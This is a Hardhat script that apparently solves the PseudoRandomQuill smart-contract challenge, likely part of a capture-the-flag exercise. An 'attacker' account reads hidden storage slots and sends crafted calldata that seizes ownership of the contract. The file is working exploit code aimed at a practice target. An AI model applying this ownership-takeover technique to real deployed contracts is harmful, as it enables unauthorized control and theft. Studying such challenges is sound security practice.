import chalk from "chalk";
import { ethers } from "hardhat";
import { PseudoRandomQuill__factory, PseudoRandomQuill } from "../../typechain";
import { log, initialize } from "../utils";


async function main() {
    let [pseudoRandomQuillContract, attacker] = await initialize<PseudoRandomQuill>(PseudoRandomQuill__factory);
    let address = await pseudoRandomQuillContract.getAddress();
    
    let chainId = (await ethers.provider.getNetwork()).chainId;
    let owner = await pseudoRandomQuillContract.owner();
    let slot = await ethers.provider.getStorage(address, chainId + BigInt(owner));
    let sslot = await ethers.provider.getStorage(address, slot);
    
    let tx = await attacker.sendTransaction({
        to: address,
        data: sslot.substring(0,10) + ethers.ZeroHash.substring(2) + ethers.zeroPadValue(attacker.address, 32).substring(2),
    });
    await tx.wait();
    
    log(`Is solved: ${chalk.yellow(await pseudoRandomQuillContract.owner() == attacker.address)}`);
    
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});